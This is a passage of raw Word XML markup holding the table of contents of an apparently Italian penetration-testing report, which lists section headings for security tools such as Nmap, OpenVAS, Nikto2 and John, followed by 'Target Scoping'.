            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378595" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2 Strumenti Utilizzati</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378595 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4F3BFB5A" w14:textId="5716BAA7"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596" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:rFonts w:cs="Times New Roman"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1 Ambiente di lavoro</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378596 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4B268BAE" w14:textId="2F7551C9"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597" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2 NetDiscover</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378597 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="20C95FD7" w14:textId="1ED8EBB2"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598" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3 nbtscan</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378598 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="686E7579" w14:textId="63714C90"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599" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4 Nmap</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378599 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="709D8FE6" w14:textId="5E07C8CE"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00" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5 OpenVAS</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378600 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="67A66ECD" w14:textId="197E450F"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01" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6 NESSUS</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378601 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76F59F3D" w14:textId="5ABC8980"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02" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7 p0f</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378602 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="47EACF29" w14:textId="331454E2"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03" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8 xsltproc</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378603 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="161A363B" w14:textId="5F9DB77C"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04" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.9 NIKTO2</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378604 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="069F4337" w14:textId="6E595504"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05" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.10 OWASP ZAP</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378605 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="26E236ED" w14:textId="3EFBBB13"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06" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.11 Gobuster</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378606 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4F61E070" w14:textId="3616202E"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07" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.12 DIRB</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378607 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="78EC0752" w14:textId="46035128"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08" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.13 OWASP DirBuster</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378608 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="11E1BE71" w14:textId="1BA1FB4D"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09" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.14 OWASP JoomScan</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378609 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1C53AD06" w14:textId="6A53F859"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10" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.15 DIRSEARCH</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378610 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="51218CF4" w14:textId="3916DD3F"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11" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>2.16 WHATWEB</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378611 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0F295B50" w14:textId="1BD637EB"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12" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.17 JOHN</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378612 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="40A0CA67" w14:textId="57DC084C" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378613" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3 Target Scoping</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378613 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
